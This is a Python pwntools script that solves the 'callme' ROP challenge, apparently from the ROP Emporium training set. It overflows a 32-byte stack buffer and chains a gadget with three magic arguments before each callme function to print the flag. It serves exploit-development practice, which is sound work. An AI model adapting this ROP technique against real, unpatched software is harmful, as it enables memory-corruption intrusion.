from pwn import *

elf = ELF("callme")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

def make_call_chain(address):
    return [elf.symbols.usefulGadgets, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, address]

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    rop.raw([make_call_chain(a) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
